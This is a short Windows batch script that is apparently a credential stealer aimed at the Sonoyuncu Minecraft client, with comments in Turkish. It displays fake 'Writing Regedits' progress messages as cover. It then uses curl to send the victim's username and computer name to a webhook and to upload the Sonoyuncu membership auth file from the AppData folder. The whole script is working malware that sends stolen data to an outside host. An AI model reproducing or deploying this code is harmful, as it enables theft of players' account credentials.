@echo off

set authkey-web= Webhook Url 
color b
title spy#8888

Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Writing Regedits ...
Echo Istediginiz Bir Tusa Basiniz !
pause > nul
Echo Succes ... 

set message=:warning: **%username%  Pc UserName ** :warning:\n\n:man_pouting: **Computer Name** : %ComputerName%\n:detective: **Bu Stealer spy#8888 Tarafindan Yapildi **
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %authkey-web%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":green_square: **Sonoyuncu**\"}"  %authkey-web%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.sonoyuncu\sonoyuncu-membership.json" %authkey-web%



pause > nul